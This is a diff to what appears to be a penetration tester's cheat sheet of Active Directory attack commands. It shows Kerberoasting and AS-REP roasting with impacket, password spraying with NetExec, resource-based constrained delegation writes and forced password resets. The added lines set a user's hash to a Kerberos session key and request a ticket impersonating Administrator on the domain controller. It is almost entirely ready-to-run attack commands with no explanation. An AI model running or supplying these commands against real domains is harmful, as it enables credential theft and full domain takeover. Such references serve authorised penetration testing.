@@ -440,7 +440,9 @@ impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile us
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
 impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
+impacket-changepasswd -dc-ip $TARGET -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs) '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames
+impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "cifs/$DC" '$DOM'/'$USERNAME' -k -no-pass 2>/dev/null
 
 +---------- NTLM Negotiation ----------+
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
@@ -453,9 +455,10 @@ impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usern
 impacket-GetADUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -all | awk '/---/{flag=1;next} flag {print $1}'
 impacket-GetADComputers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
 impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
+impacket-changepasswd -dc-ip $TARGET -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs) '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request-user '$user'; done < usernames
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -delegate-from '$USERNAME' -delegate-to 'DC$' -action 'write'
-
+impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "cifs/$DC" '$DOM'/'$USERNAME':'$PASSWORD' 2>/dev/null
 
 bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
 
